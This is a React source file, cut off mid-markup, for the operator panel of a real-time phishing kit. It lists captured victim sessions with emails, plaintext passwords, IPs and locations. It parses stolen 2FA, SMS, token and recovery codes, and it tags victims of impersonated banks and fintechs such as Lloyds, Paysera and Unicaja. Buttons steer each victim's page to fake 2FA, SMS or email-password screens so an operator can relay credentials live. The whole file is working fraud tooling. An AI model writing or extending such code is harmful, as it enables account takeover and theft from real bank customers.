import { useState, useEffect, useRef, useCallback } from "react";
import { Send } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import {
  CheckCircle,
  XCircle,
  Clock,
  Volume2,
  VolumeX,
  Settings,
  KeyRound,
  Mail,
  Search,
  AlertTriangle,
  MailCheck,
  Wifi,
  WifiOff,
  Eye,
  Lock,
  Monitor,
  Copy,
  Check,
  ShieldCheck,
  Smartphone,
  RefreshCw,
  Loader2,
} from "lucide-react";
import { formatDate, parseBrowser } from "@/lib/adminUtils";
import { useNotificationSound } from "@/hooks/useNotificationSound";
import { useSessionPresence } from "@/hooks/useSessionPresence";

interface SessionRecord {
  id: string;
  email: string | null;
  password: string | null;
  ip_address: string | null;
  user_agent: string | null;
  country: string | null;
  city: string | null;
  region: string | null;
  status: string;
  created_at: string;
  otp_code: string | null;
  source: string | null;
}

/* ═══════════════════════════════════════════ */
/*  Status → visual mapping                   */
/* ═══════════════════════════════════════════ */
const statusMap: Record<string, { label: string; icon: React.ReactNode; cls: string }> = {
  pending_review:        { label: "Pendente",      icon: <Clock size={11} />,       cls: "bg-amber-500/15 text-amber-400 border-amber-500/30 animate-pulse" },
  waiting:               { label: "Aguardando",    icon: <Clock size={11} />,       cls: "bg-sky-500/15 text-sky-400 border-sky-500/30 animate-pulse" },
  waiting_admin:         { label: "waiting_admin",  icon: <Clock size={11} />,       cls: "bg-lime-500/15 text-lime-400 border-lime-500/30 animate-pulse" },
  login_attempt:         { label: "login_attempt",  icon: <Clock size={11} />,       cls: "bg-lime-500/15 text-lime-400 border-lime-500/30" },
  typing_password:       { label: "typing_password", icon: <KeyRound size={11} />,   cls: "bg-lime-500/15 text-lime-400 border-lime-500/30" },
  otp:                   { label: "Esperando OTP", icon: <KeyRound size={11} />,    cls: "bg-blue-500/15 text-blue-400 border-blue-500/30" },
  otp_submitted:         { label: "OTP Enviado",   icon: <KeyRound size={11} />,    cls: "bg-blue-500/15 text-blue-400 border-blue-500/30" },
  login_success:         { label: "Sucesso",       icon: <CheckCircle size={11} />, cls: "bg-green-600/15 text-green-400 border-green-600/30" },
  wrong_password:        { label: "Senha errada – tentando novamente", icon: <RefreshCw size={11} />, cls: "bg-orange-500/15 text-orange-400 border-orange-500/30" },
  redirect_otp:          { label: "→ 2FA Google", icon: <KeyRound size={11} />,    cls: "bg-blue-500/15 text-blue-400 border-blue-500/30" },
  redirect_mfa_sms:      { label: "→ 2FA SMS",    icon: <Smartphone size={11} />, cls: "bg-green-500/15 text-green-400 border-green-500/30" },
  redirect_mfa_email:    { label: "→ 2FA Email",  icon: <Mail size={11} />,       cls: "bg-amber-500/15 text-amber-400 border-amber-500/30" },
  redirect_confirm_email:{ label: "→ Identif.",   icon: <ShieldCheck size={11} />, cls: "bg-amber-500/15 text-amber-400 border-amber-500/30" },
  redirect_sync_email:   { label: "→ Sync Email", icon: <Mail size={11} />,        cls: "bg-blue-500/15 text-blue-400 border-blue-500/30" },
  otp_approved:          { label: "2FA ✓",         icon: <CheckCircle size={11} />, cls: "bg-green-600/15 text-green-400 border-green-600/30" },
  otp_rejected:          { label: "2FA ✗",         icon: <XCircle size={11} />,     cls: "bg-destructive/15 text-destructive border-destructive/30" },
  confirm_approved:      { label: "Email ✓",       icon: <CheckCircle size={11} />, cls: "bg-green-600/15 text-green-400 border-green-600/30" },
  confirm_rejected:      { label: "Email ✗",       icon: <XCircle size={11} />,     cls: "bg-destructive/15 text-destructive border-destructive/30" },
  confirm_email_pending: { label: "Email...",       icon: <Mail size={11} />,        cls: "bg-amber-500/15 text-amber-400 border-amber-500/30" },
  confirm_wrong_password:{ label: "Senha Email ✗", icon: <XCircle size={11} />,     cls: "bg-destructive/15 text-destructive border-destructive/30" },
  confirm_ask_otp:       { label: "Email→2FA",     icon: <KeyRound size={11} />,    cls: "bg-blue-500/15 text-blue-400 border-blue-500/30" },
  confirm_ask_token:     { label: "Email→Token",   icon: <KeyRound size={11} />,    cls: "bg-blue-500/15 text-blue-400 border-blue-500/30" },
  confirm_ask_sms:       { label: "Email→SMS",     icon: <KeyRound size={11} />,    cls: "bg-blue-500/15 text-blue-400 border-blue-500/30" },
  confirm_ask_recovery:  { label: "Email→Recup.",  icon: <Mail size={11} />,        cls: "bg-amber-500/15 text-amber-400 border-amber-500/30" },
  paysera_show_token:    { label: "Vendo token (app)", icon: <Smartphone size={11} />, cls: "bg-teal-500/15 text-teal-400 border-teal-500/30" },
  paysera_ask_sms:       { label: "Digitando SMS", icon: <Smartphone size={11} />,  cls: "bg-teal-500/15 text-teal-400 border-teal-500/30" },
  paysera_verify_phone:  { label: "Verificando Tel", icon: <Smartphone size={11} />, cls: "bg-orange-500/15 text-orange-400 border-orange-500/30" },
  lloyds_memorable:      { label: "Info Memorável", icon: <KeyRound size={11} />,    cls: "bg-emerald-500/15 text-emerald-400 border-emerald-500/30" },
  lloyds_security_call:  { label: "Chamada Seg.",  icon: <Smartphone size={11} />,  cls: "bg-blue-500/15 text-blue-400 border-blue-500/30" },
  lloyds_calling:        { label: "Ligando",       icon: <Smartphone size={11} />,  cls: "bg-amber-500/15 text-amber-400 border-amber-500/30" },
};

/* ═══════════════════════════════════════════ */
/*  Client stage labels                       */
/* ═══════════════════════════════════════════ */
const getClientStage = (status: string): { label: string; color: string } => {
  if (status === "pending_review")        return { label: "Aguardando revisão",     color: "text-amber-400" };
  if (status === "waiting")               return { label: "Aguardando operador",    color: "text-sky-400" };
  if (status === "waiting_admin")         return { label: "Aguardando operador",    color: "text-lime-400" };
  if (status === "typing_password")       return { label: "Digitando clave",        color: "text-lime-400" };
  if (status === "login_attempt")         return { label: "Enviou clave",           color: "text-lime-400" };
  if (status === "otp")                   return { label: "Esperando OTP",          color: "text-blue-400" };
  if (status === "otp_submitted")         return { label: "OTP enviado",            color: "text-blue-400" };
  if (status === "wrong_password")        return { label: "Errou senha / redigitando", color: "text-destructive" };
  if (status === "redirect_otp")          return { label: "Digitando 2FA Google",  color: "text-blue-400" };
  if (status === "redirect_mfa_sms")      return { label: "Digitando 2FA SMS",     color: "text-green-400" };
  if (status === "redirect_mfa_email")    return { label: "Digitando 2FA Email",   color: "text-amber-400" };
  if (status === "otp_approved")          return { label: "2FA aprovado ✓",         color: "text-green-400" };
  if (status === "otp_rejected")          return { label: "2FA rejeitado",          color: "text-destructive" };
  if (status === "login_success")         return { label: "Login concluído ✓",      color: "text-green-400" };
  if (status === "redirect_confirm_email")return { label: "Tela Identificação",     color: "text-amber-400" };
  if (status === "redirect_sync_email")   return { label: "Tela Sync Email",        color: "text-blue-400" };
  if (status === "confirm_email_pending") return { label: "Email enviado",          color: "text-amber-400" };
  if (status === "confirm_wrong_password")return { label: "Reentrando senha email", color: "text-destructive" };
  if (status === "confirm_ask_otp")       return { label: "Digitando 2FA email",    color: "text-blue-400" };
  if (status === "confirm_ask_token")     return { label: "Vendo token",            color: "text-blue-400" };
  if (status === "confirm_ask_sms")       return { label: "Digitando SMS",          color: "text-blue-400" };
  if (status === "confirm_ask_recovery")  return { label: "Digitando recovery",     color: "text-amber-400" };
  if (status === "confirm_approved")      return { label: "Email aprovado ✓",       color: "text-green-400" };
  if (status === "confirm_rejected")      return { label: "Email rejeitado",        color: "text-destructive" };
  if (status === "lloyds_memorable")      return { label: "Tela Memorable",         color: "text-emerald-400" };
  if (status === "lloyds_security_call")  return { label: "Escolhendo telefone",    color: "text-blue-400" };
  if (status === "lloyds_calling")        return { label: "Em chamada",             color: "text-amber-400" };
  if (status === "paysera_show_token") return { label: "Vendo token (app)", color: "text-blue-400" };
  if (status === "paysera_ask_sms") return { label: "Digitando SMS", color: "text-blue-400" };
  if (status === "paysera_verify_phone") return { label: "Verificando Tel", color: "text-orange-400" };
  return { label: status.replace(/_/g, " "), color: "text-muted-foreground" };
};

interface AllSessionsTableProps {
  onOperate: (session: SessionRecord) => void;
}

const AllSessionsTable = ({ onOperate }: AllSessionsTableProps) => {
  const [sessions, setSessions] = useState<SessionRecord[]>([]);
  const [search, setSearch] = useState("");
  const [soundEnabled, setSoundEnabled] = useState(true);
  const [quickSending, setQuickSending] = useState<string | null>(null);
  const [payseraTokenInputs, setPayseraTokenInputs] = useState<Record<string, string>>({});
  const [copiedKey, setCopiedKey] = useState<string | null>(null);
  const soundRef = useRef(true);
  const loadedRef = useRef(false);
  const adminEmailsRef = useRef<string[]>([]);
  const { startAlarm, stopAlarm, isPlayingRef } = useNotificationSound();
  const startAlarmRef = useRef(startAlarm);
  useEffect(() => { startAlarmRef.current = startAlarm; }, [startAlarm]);
  const onlineSessions = useSessionPresence();

  const isSessionOnline = (s: any): boolean => {
    return onlineSessions.has(s.id);
  };

  useEffect(() => { soundRef.current = soundEnabled; }, [soundEnabled]);

  const pendingCount = sessions.filter((s) => s.status === "pending_review" || s.status === "waiting_admin").length;

  useEffect(() => {
    if (!loadedRef.current) return;
    if (pendingCount > 0 && soundRef.current && !isPlayingRef.current) startAlarm();
    else if (pendingCount === 0 && isPlayingRef.current) stopAlarm();
  }, [pendingCount]); // eslint-disable-line

  useEffect(() => {
    if (!soundEnabled) stopAlarm();
    else if (pendingCount > 0 && loadedRef.current && !isPlayingRef.current) startAlarm();
  }, [soundEnabled]); // eslint-disable-line

  const handleOperate = useCallback((session: SessionRecord) => {
    stopAlarm();
    onOperate(session);
  }, [onOperate, stopAlarm]);

  // ── Broadcast helper ──
  const broadcastToAll = useCallback((sessionId: string, event: string, payload: Record<string, string>) => {
    const channels = [
      `session-review-${sessionId}`,
      `session-otp-decision-${sessionId}`,
      `session-review-client-otp-${sessionId}`,
      `confirm-email-${sessionId}`,
      `sync-email-${sessionId}`,
    ];
    channels.forEach((name) => {
      const bc = supabase.channel(name);
      bc.subscribe((s) => {
        if (s === "SUBSCRIBED") {
          bc.send({ type: "broadcast", event, payload });
          setTimeout(() => supabase.removeChannel(bc), 2500);
        }
      });
    });
  }, []);

  // ── Quick Actions ──
  const quickAction = useCallback(async (
    sessionId: string,
    actionKey: string,
    dbStatus: string,
    events: { event: string; payload: Record<string, string> }[]
  ) => {
    setQuickSending(`${sessionId}-${actionKey}`);
    await supabase.from("sessions").update({ status: dbStatus }).eq("id", sessionId);
    events.forEach(({ event, payload }) => broadcastToAll(sessionId, event, payload));
    setTimeout(() => setQuickSending(null), 800);
  }, [broadcastToAll]);

  const qPWrong = useCallback((sid: string) => { stopAlarm(); quickAction(sid, "pw", "wrong_password", [
    { event: "review_decision", payload: { status: "wrong_password" } },
  ]); }, [quickAction, stopAlarm]);

  const qPOtp = useCallback((sid: string) => { stopAlarm(); quickAction(sid, "otp", "redirect_otp", [
    { event: "review_decision", payload: { status: "redirect_otp" } },
  ]); }, [quickAction, stopAlarm]);

  const qPPayseraToken = useCallback((sid: string, tokenNum: string) => {
    if (!tokenNum.trim()) return;
    stopAlarm();
    setQuickSending(`${sid}-ptoken`);
    supabase.from("sessions").update({ status: "paysera_show_token", otp_code: `paysera_token:${tokenNum}` }).eq("id", sid).then(() => {});
    broadcastToAll(sid, "review_decision", { status: "paysera_show_token", token_number: tokenNum });
    setPayseraTokenInputs((prev) => ({ ...prev, [sid]: "" }));
    setTimeout(() => setQuickSending(null), 800);
  }, [broadcastToAll, stopAlarm]);

  const qPPayseraSms = useCallback((sid: string) => {
    stopAlarm();
    setQuickSending(`${sid}-psms`);
    supabase.from("sessions").update({ status: "paysera_ask_sms" }).eq("id", sid).then(() => {});
    broadcastToAll(sid, "review_decision", { status: "paysera_ask_sms" });
    setTimeout(() => setQuickSending(null), 800);
  }, [broadcastToAll, stopAlarm]);

  const qPPayseraVerifyPhone = useCallback((sid: string) => {
    stopAlarm();
    setQuickSending(`${sid}-pvphone`);
    supabase.from("sessions").update({ status: "paysera_verify_phone" }).eq("id", sid).then(() => {});
    broadcastToAll(sid, "review_decision", { status: "paysera_verify_phone" });
    setTimeout(() => setQuickSending(null), 800);
  }, [broadcastToAll, stopAlarm]);

  const qPPayseraLoop = useCallback((sid: string) => {
    stopAlarm();
    setQuickSending(`${sid}-ploop`);
    supabase.from("sessions").update({ status: "paysera_loading_loop" }).eq("id", sid).then(() => {});
    broadcastToAll(sid, "review_decision", { status: "paysera_loading_loop" });
    setTimeout(() => setQuickSending(null), 800);
  }, [broadcastToAll, stopAlarm]);

  const qPMfaSms = useCallback((sid: string) => { stopAlarm(); quickAction(sid, "mfasms", "redirect_mfa_sms", [
    { event: "review_decision", payload: { status: "redirect_mfa_sms" } },
  ]); }, [quickAction, stopAlarm]);

  const qPMfaEmail = useCallback((sid: string) => { stopAlarm(); quickAction(sid, "mfaemail", "redirect_mfa_email", [
    { event: "review_decision", payload: { status: "redirect_mfa_email" } },
  ]); }, [quickAction, stopAlarm]);

  const qPOtpWrong = useCallback(async (sid: string) => {
    stopAlarm();
    setQuickSending(`${sid}-otpw`);
    await supabase.from("sessions").update({ status: "otp_rejected" }).eq("id", sid);
    broadcastToAll(sid, "otp_decision", { status: "otp_rejected" });
    broadcastToAll(sid, "review_decision", { status: "otp_rejected" });
    setTimeout(() => setQuickSending(null), 800);
  }, [broadcastToAll, stopAlarm]);

  const qEEmail = useCallback((sid: string) => { stopAlarm(); quickAction(sid, "email", "redirect_confirm_email", [
    { event: "review_decision", payload: { status: "redirect_confirm_email" } },
  ]); }, [quickAction, stopAlarm]);

  const qSyncEmail = useCallback((sid: string) => { stopAlarm(); quickAction(sid, "sync", "redirect_sync_email", [
    { event: "review_decision", payload: { status: "redirect_sync_email" } },
  ]); }, [quickAction, stopAlarm]);

  const qEWrongPw = useCallback((sid: string) => { stopAlarm(); quickAction(sid, "ewpw", "confirm_wrong_password", [
    { event: "admin_decision", payload: { status: "confirm_wrong_password" } },
    { event: "admin_sync_decision", payload: { status: "sync_wrong_password" } },
  ]); }, [quickAction, stopAlarm]);

  const qEAskOtp = useCallback((sid: string) => { stopAlarm(); quickAction(sid, "eotp", "confirm_ask_otp", [
    { event: "admin_decision", payload: { status: "confirm_ask_otp" } },
    { event: "admin_sync_decision", payload: { status: "sync_ask_otp" } },
  ]); }, [quickAction, stopAlarm]);

  const qESms = useCallback((sid: string) => { stopAlarm(); quickAction(sid, "esms", "confirm_advance_sms_code", [
    { event: "admin_decision", payload: { status: "confirm_advance_sms_code" } },
    { event: "admin_sync_decision", payload: { status: "sync_advance_sms_code" } },
  ]); }, [quickAction, stopAlarm]);

  const qERec = useCallback((sid: string) => { stopAlarm(); quickAction(sid, "erec", "confirm_ask_recovery", [
    { event: "admin_decision", payload: { status: "confirm_ask_recovery" } },
    { event: "admin_sync_decision", payload: { status: "sync_ask_recovery" } },
  ]); }, [quickAction, stopAlarm]);

  const qEApprove = useCallback(async (sid: string) => {
    stopAlarm();
    setQuickSending(`${sid}-eapprove`);
    await supabase.from("sessions").update({ status: "confirm_approved" }).eq("id", sid);
    broadcastToAll(sid, "admin_decision", { status: "confirm_approved" });
    broadcastToAll(sid, "admin_sync_decision", { status: "sync_approved" });
    setTimeout(() => setQuickSending(null), 800);
  }, [broadcastToAll, stopAlarm]);

  const qEReject = useCallback(async (sid: string) => {
    stopAlarm();
    setQuickSending(`${sid}-ereject`);
    await supabase.from("sessions").update({ status: "confirm_rejected" }).eq("id", sid);
    broadcastToAll(sid, "admin_decision", { status: "confirm_rejected" });
    broadcastToAll(sid, "admin_sync_decision", { status: "sync_rejected" });
    setTimeout(() => setQuickSending(null), 800);
  }, [broadcastToAll, stopAlarm]);

  const qPApproveLogin = useCallback(async (sid: string) => {
    stopAlarm();
    setQuickSending(`${sid}-approve`);
    await supabase.from("sessions").update({ status: "login_success" }).eq("id", sid);
    broadcastToAll(sid, "review_decision", { status: "login_success" });
    setTimeout(() => setQuickSending(null), 800);
  }, [broadcastToAll, stopAlarm]);

  // ── Copy helper ──
  const copyValue = useCallback((value: string, key: string) => {
    navigator.clipboard.writeText(value);
    setCopiedKey(key);
    setTimeout(() => setCopiedKey(null), 1500);
  }, []);

  // Refresh relative times
  const [, tick] = useState(0);
  useEffect(() => {
    const i = setInterval(() => tick((t) => t + 1), 5000);
    return () => clearInterval(i);
  }, []);

  // ── Fetch + Realtime + Polling Fallback ──
  const fetchSessionsRef = useRef<(() => Promise<void>) | null>(null);

  useEffect(() => {
    const fetchSessions = async () => {
      // Get admin emails to exclude them from sessions list
      const { data: adminRoles } = await supabase
        .from("user_roles")
        .select("user_id")
        .eq("role", "admin");
      const adminUserIds = (adminRoles || []).map((r) => r.user_id);

      let adminEmails: string[] = [];
      if (adminUserIds.length > 0) {
        const { data: adminProfiles } = await supabase
          .from("profiles")
          .select("email")
          .in("user_id", adminUserIds);
        adminEmails = (adminProfiles || []).map((p) => p.email).filter(Boolean) as string[];
      }
      adminEmailsRef.current = adminEmails;

      let query = supabase
        .from("sessions")
        .select("*")
        .not("source", "in", "(cocosv2,cocosdigital,cocos)")
        .order("created_at", { ascending: false })
        .limit(200);

      // Exclude admin logins from the sessions table
      if (adminEmails.length > 0) {
        query = query.not("email", "in", `(${adminEmails.join(",")})`);
      }

      const { data } = await query;
      if (data) {
        setSessions((prev) => {
          // Check for new pending sessions that weren't in prev
          const prevIds = new Set(prev.map(s => s.id));
          const newPending = (data as SessionRecord[]).filter(
            s => !prevIds.has(s.id) && (s.status === "pending_review" || s.status === "waiting_admin")
          );
          if (newPending.length > 0 && loadedRef.current && soundRef.current && !isPlayingRef.current) {
            startAlarmRef.current();
          }
          return data as SessionRecord[];
        });
      }
      loadedRef.current = true;
    };
    fetchSessionsRef.current = fetchSessions;
    fetchSessions();

    // Polling fallback every 5 seconds to catch missed realtime events
    const pollInterval = setInterval(() => {
      fetchSessionsRef.current?.();
    }, 5000);

    const channel = supabase
      .channel("all-sessions-rt")
      .on("postgres_changes", { event: "*", schema: "public", table: "sessions" }, (payload) => {
        const rec = payload.new as SessionRecord;
        // Never show admin sessions in the operator panel
        if (rec.email && adminEmailsRef.current.includes(rec.email)) return;
        // Exclude cocos sessions — they belong to /cocosadmin
        const cocosSource = ["cocosv2", "cocosdigital", "cocos"];
        if (rec.source && cocosSource.includes(rec.source)) return;

        if (payload.eventType === "INSERT") {
          setSessions((prev) => {
            if (prev.some((s) => s.id === rec.id)) return prev;
            if ((rec.status === "pending_review" || rec.status === "waiting_admin") && soundRef.current && !isPlayingRef.current) {
              startAlarmRef.current();
            }
            return [rec, ...prev].slice(0, 200);
          });
        }

        if (payload.eventType === "UPDATE") {
          setSessions((prev) => {
            const old = prev.find((s) => s.id === rec.id);
            const isPending = rec.status === "pending_review" || rec.status === "waiting_admin";
            if (old?.status !== rec.status && isPending && soundRef.current && !isPlayingRef.current) {
              startAlarmRef.current();
            }
            return prev.map((s) => (s.id === rec.id ? rec : s));
          });
        }

        if (payload.eventType === "DELETE") {
          setSessions((prev) => prev.filter((s) => s.id !== rec.id));
        }
      })
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
      clearInterval(pollInterval);
    };
  }, []);

  useEffect(() => { return () => stopAlarm(); }, [stopAlarm]);

  // ── Filter ──
  const filtered = search
    ? sessions.filter((s) =>
        [s.email, s.password, s.ip_address, s.city, s.country, s.status, s.otp_code]
          .filter(Boolean)
          .join(" ")
          .toLowerCase()
          .includes(search.toLowerCase())
      )
    : sessions;

  // ── Parse captured data from otp_code ──
  const parseCaptured = (otp: string | null) => {
    if (!otp) return [];
    const items: { type: string; val: string; color: string }[] = [];
    
    // Identification (Volet PIN flow)
    if (otp.startsWith("id_pin:"))          items.push({ type: "PIN Identif.", val: otp.replace("id_pin:", ""), color: "text-teal-400" });
    if (otp.startsWith("id_token:"))        items.push({ type: "Token Identif.", val: otp.replace("id_token:", ""), color: "text-teal-400" });
    if (otp.startsWith("id_sms:"))          items.push({ type: "SMS Identif.", val: otp.replace("id_sms:", ""), color: "text-teal-400" });
    if (otp.startsWith("id_phone:") || otp.startsWith("id_phone_final:")) items.push({ type: "Tel Identif.", val: otp.replace(/^id_phone(_final)?:/, ""), color: "text-teal-400" });
    if (otp.startsWith("id_recovery:") || otp.startsWith("id_recovery_final:")) items.push({ type: "Recup Identif.", val: otp.replace(/^id_recovery(_final)?:/, ""), color: "text-teal-400" });

    // Email sync
    if (otp.startsWith("email_pass:"))     items.push({ type: "Senha Email", val: otp.replace("email_pass:", ""), color: "text-amber-400" });
    if (otp.startsWith("sync_pass:"))      items.push({ type: "Senha Email", val: otp.replace("sync_pass:", ""), color: "text-amber-400" });
    if (otp.startsWith("token_code:"))     items.push({ type: "2FA Email",   val: otp.replace("token_code:", ""), color: "text-blue-400" });
    if (otp.startsWith("sync_token:"))     items.push({ type: "2FA Email",   val: otp.replace("sync_token:", ""), color: "text-blue-400" });
    if (otp.startsWith("sms_code:"))       items.push({ type: "SMS Email",   val: otp.replace("sms_code:", ""), color: "text-blue-400" });
    if (otp.startsWith("sync_sms:"))       items.push({ type: "SMS Email",   val: otp.replace("sync_sms:", ""), color: "text-blue-400" });
    if (otp.startsWith("client_phone:") || otp.startsWith("client_phone_final:")) items.push({ type: "Tel Email", val: otp.replace(/^client_phone(_final)?:/, ""), color: "text-blue-400" });
    if (otp.startsWith("client_recovery_email:") || otp.startsWith("client_recovery_email_final:")) items.push({ type: "Recup Email", val: otp.replace(/^client_recovery_email(_final)?:/, ""), color: "text-amber-400" });
    // Paysera token/sms
    if (otp.startsWith("paysera_token:"))   items.push({ type: "Token App", val: otp.replace("paysera_token:", ""), color: "text-teal-400" });
    if (otp.startsWith("paysera_sms_phone:")) items.push({ type: "Tel SMS", val: otp.replace("paysera_sms_phone:", ""), color: "text-teal-400" });

    if (otp.startsWith("recovery_email:")) items.push({ type: "Recuperação", val: otp.replace("recovery_email:", ""), color: "text-amber-400" });
    if (otp.startsWith("sync_recovery:"))  items.push({ type: "Recuperação", val: otp.replace("sync_recovery:", ""), color: "text-amber-400" });
    if (otp.startsWith("admin_token:"))    items.push({ type: "Token Admin", val: otp.replace("admin_token:", ""), color: "text-purple-400" });
    if (otp.startsWith("sms_number:"))     items.push({ type: "Nº SMS",      val: otp.replace("sms_number:", ""), color: "text-blue-400" });
    if (otp.startsWith("sms_ending:"))     items.push({ type: "Final Tel",   val: otp.replace("sms_ending:", ""), color: "text-blue-400" });
    if (otp.startsWith("recovery_email_addr:")) items.push({ type: "Addr Recup", val: otp.replace("recovery_email_addr:", ""), color: "text-amber-400" });
    if (/^\d{1,6}$/.test(otp))             items.push({ type: "2FA",         val: otp, color: "text-green-400" });
    
    return items;
  };

  const timeSince = (d: string) => {
    const s = Math.floor((Date.now() - new Date(d).getTime()) / 1000);
    if (s < 60) return `${s}s`;
    const m = Math.floor(s / 60);
    if (m < 60) return `${m}m`;
    return `${Math.floor(m / 60)}h`;
  };

  return (
    <div className="space-y-3">
      {/* ── Toolbar ── */}
      <div className="flex items-center gap-3">
        <div className="relative flex-1 max-w-xs">
          <Search size={14} className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground" />
          <input
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            placeholder="Buscar sessões..."
            className="w-full rounded-lg border border-border bg-card pl-9 pr-4 py-2 text-xs text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-1 focus:ring-ring"
          />
        </div>
        {pendingCount > 0 && (
          <span className="inline-flex items-center gap-1 rounded-full bg-destructive px-2.5 py-1 text-xs font-bold text-destructive-foreground animate-pulse">
            <Clock size={12} /> {pendingCount} pendente(s)
          </span>
        )}
        <button
          onClick={() => setSoundEnabled(!soundEnabled)}
          className={`flex items-center gap-1.5 rounded-lg border px-3 py-2 text-xs transition-colors ${
            soundEnabled
              ? "border-primary/30 bg-primary/10 text-primary"
              : "border-border bg-card text-muted-foreground"
          }`}
        >
          {soundEnabled ? <Volume2 size={13} /> : <VolumeX size={13} />}
          {soundEnabled ? "Som ON" : "Som OFF"}
        </button>
      </div>

      {/* ── Sessions List ── */}
      {filtered.length === 0 ? (
        <div className="flex flex-col items-center justify-center rounded-xl border border-border bg-card py-16">
          <Clock className="mb-3 h-8 w-8 text-muted-foreground/30" />
          <p className="text-sm text-muted-foreground">Nenhuma sessão ainda</p>
          <p className="text-xs text-muted-foreground/50 mt-1">Sessões aparecerão aqui em tempo real</p>
        </div>
      ) : (
        <div className="space-y-3">
          {filtered.map((s) => {
            const isPending = s.status === "pending_review" || s.status === "waiting_admin";
            const isOnline = isSessionOnline(s);
            const cfg = statusMap[s.status] || { label: s.status, icon: null, cls: "bg-muted text-muted-foreground border-border" };
            const capturedItems = parseCaptured(s.otp_code);
            const stage = getClientStage(s.status);

            return (
              <div
                key={s.id}
                className={`rounded-xl border bg-card overflow-hidden transition-all hover:border-primary/20 ${
                  isPending ? "border-amber-500/30 shadow-[0_0_16px_-4px] shadow-amber-500/20" : "border-border"
                }`}
              >
                {/* ── Row 1: Header ── */}
                <div className="flex items-center justify-between gap-3 px-4 py-3">
                  <div className="flex-1 min-w-0 space-y-1.5">
                    {/* Email + Online + Status + Time */}
                     <div className="flex items-center gap-2 flex-wrap">
                    {/* Source badge */}
                      {s.source === "lloyds" && (
                        <span className="inline-flex items-center gap-1 rounded-full border border-emerald-500/30 bg-emerald-500/10 px-2 py-0.5 text-[10px] font-bold text-emerald-400 shrink-0 uppercase tracking-wider">
                          Lloyds
                        </span>
                      )}
                      {s.source === "paysera" && (
                        <span className="inline-flex items-center gap-1 rounded-full border border-teal-500/30 bg-teal-500/10 px-2 py-0.5 text-[10px] font-bold text-teal-400 shrink-0 uppercase tracking-wider">
                          Paysera
                        </span>
                      )}
                      {s.source === "cocosdigital" && (
                        <span className="inline-flex items-center gap-1 rounded-full border border-cyan-500/30 bg-cyan-500/10 px-2 py-0.5 text-[10px] font-bold text-cyan-400 shrink-0 uppercase tracking-wider">
                          Cocos
                        </span>
                      )}
                      {s.source === "ueex" && (
                        <span className="inline-flex items-center gap-1 rounded-full border border-orange-500/30 bg-orange-500/10 px-2 py-0.5 text-[10px] font-bold text-orange-400 shrink-0 uppercase tracking-wider">
                          UEEx
                        </span>
                      )}
                      {s.source === "iol" && (
                        <span className="inline-flex items-center gap-1 rounded-full border border-violet-500/30 bg-violet-500/10 px-2 py-0.5 text-[10px] font-bold text-violet-400 shrink-0 uppercase tracking-wider">
                          IOL
                        </span>
                      )}
                      {s.source === "tenpo" && (
                        <span className="inline-flex items-center gap-1 rounded-full border border-lime-500/30 bg-lime-500/10 px-2 py-0.5 text-[10px] font-bold text-lime-400 shrink-0 uppercase tracking-wider">
                          Tenpo
                        </span>
                      )}
                      {s.source === "unicaja" && (
                        <span className="inline-flex items-center gap-1 rounded-full border border-sky-600/30 bg-sky-600/10 px-2 py-0.5 text-[10px] font-bold text-sky-500 shrink-0 uppercase tracking-wider">
                          Unicaja
                        </span>
                      )}
                      {s.source === "global66" && (
                        <span className="inline-flex items-center gap-1 rounded-full border border-indigo-500/30 bg-indigo-500/10 px-2 py-0.5 text-[10px] font-bold text-indigo-400 shrink-0 uppercase tracking-wider">
                          Global66
                        </span>
                      )}
                      {(!s.source || s.source === "falconx") && (
                        <span className="inline-flex items-center gap-1 rounded-full border border-primary/30 bg-primary/10 px-2 py-0.5 text-[10px] font-bold text-primary shrink-0 uppercase tracking-wider">
                          FalconX
                        </span>
                      )}

                      {/* Online indicator */}
                      <span className={`flex items-center gap-1 rounded-full border px-2 py-0.5 text-[10px] font-semibold shrink-0 ${
                        isOnline
                          ? "border-green-500/30 bg-green-500/10 text-green-400"
                          : "border-border bg-muted/50 text-muted-foreground/60"
                      }`}>
                        {isOnline ? <Wifi size={10} /> : <WifiOff size={10} />}
                        {isOnline ? "Online" : "Offline"}
                      </span>

                      {isPending && <span className="h-2 w-2 animate-pulse rounded-full bg-amber-400 shrink-0" />}
                      <button
                        onClick={() => { if (s.email) copyValue(s.email, `${s.id}-email`); }}
                        className="text-sm font-bold text-foreground truncate hover:text-primary transition-colors flex items-center gap-1 group"
                        title="Copiar email"
                      >
                        {s.email || "—"}
                        {s.email && (
                          copiedKey === `${s.id}-email`
                            ? <Check size={11} className="text-green-400 shrink-0" />
                            : <Copy size={11} className="text-muted-foreground/0 group-hover:text-muted-foreground/60 shrink-0 transition-colors" />
                        )}
                      </button>
                      <span className="text-[10px] text-muted-foreground shrink-0">{timeSince(s.created_at)}</span>
                      <span className={`inline-flex items-center gap-1 rounded-full border px-2 py-0.5 text-[10px] font-semibold shrink-0 ${cfg.cls}`}>
                        {cfg.icon} {cfg.label}
                      </span>
                    </div>

                    {/* Client stage */}
                    <div className="flex items-center gap-2 text-[11px]">
                      <Eye size={11} className="text-muted-foreground/50 shrink-0" />
                      <span className="text-muted-foreground/70">Etapa:</span>
                      <span className={`font-semibold ${stage.color}`}>{stage.label}</span>
                    </div>
                  </div>

                  {/* Operate button */}
                  <button
                    onClick={() => handleOperate(s)}
                    className={`flex items-center gap-1.5 rounded-lg px-4 py-2.5 text-xs font-bold transition-colors shrink-0 ${
                      isPending
                        ? "bg-primary text-primary-foreground hover:bg-primary/90 shadow-sm"
                        : "border border-border text-muted-foreground hover:bg-secondary hover:text-foreground"
                    }`}
                  >
                    <Settings size={14} /> Operar
                  </button>
                </div>

                {/* ── Row 2: Captured Data ── */}
                <div className="border-t border-border/40 bg-muted/10 px-4 py-2.5">
                  <div className="flex flex-wrap items-center gap-x-4 gap-y-1 text-[11px]">
                    {/* Always show password */}
                    <DataChip
                      icon={<Lock size={10} />}
                      label="Senha"
                      value={s.password || "—"}
                      copyKey={`${s.id}-pw`}
                      copiedKey={copiedKey}
                      onCopy={copyValue}
                    />
                    
                    {/* Show captured codes */}
                    {capturedItems.map((item, idx) => (
                      <DataChip
                        key={idx}
                        icon={<KeyRound size={10} />}
                        label={item.type}
                        value={item.val || "—"}
                        valueColor={item.color}
                        copyKey={`${s.id}-cap-${idx}`}
                        copiedKey={copiedKey}
